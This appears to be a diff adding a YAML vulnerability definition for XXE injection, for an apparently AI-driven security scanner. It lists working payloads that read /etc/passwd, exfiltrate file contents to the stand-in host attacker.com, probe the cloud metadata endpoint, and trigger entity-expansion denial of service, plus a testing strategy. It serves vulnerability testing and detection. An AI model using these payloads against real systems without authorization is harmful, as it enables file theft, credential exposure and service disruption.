@@ -1,0 +1,41 @@
+id: XXE
+name: XML External Entity Injection
+cwe:
+- CWE-611
+owasp: A05:2021 Security Misconfiguration
+severity_range: High - Critical
+description: Application parses XML input with external entity processing enabled, allowing file read, SSRF, or denial of
+  service.
+detection:
+  payloads:
+    file_read:
+    - <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+    - <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>
+    blind_oob:
+    - <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>
+    - <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=test">]><foo>&xxe;</foo>
+    ssrf_via_xxe:
+    - <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>
+    - <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><foo>&xxe;</foo>
+    dos_billion_laughs:
+    - <?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><foo>&lol2;</foo>
+    parameter_entities:
+    - <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil
+      SYSTEM 'http://attacker.com/?x=%file;'>">%eval;%exfil;]>
+  strategy:
+  - 1. Identify XML input points (API endpoints, file uploads, SOAP, SVG)
+  - 2. Test with simple external entity referencing a known file
+  - 3. If no direct output, test blind XXE with OOB callback
+  - 4. Test via SVG upload if file upload exists
+  - 5. Test SOAP endpoints with XXE in SOAP body
+  - '6. Check for JSON endpoints that also accept XML (Content-Type: application/xml)'
+  - 7. Test parameter entities for blind exfiltration
+evidence_needed: File content from server, DNS/HTTP callback from blind XXE, or SSRF to internal service via XXE
+ai_research_hints:
+- Check if JSON APIs also accept XML by changing Content-Type header
+- Test file upload endpoints with SVG containing XXE
+- Check for XSLT injection which can lead to similar impacts
+- Test DOCX/XLSX uploads — they're ZIP files containing XML
+references:
+- https://portswigger.net/web-security/xxe
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
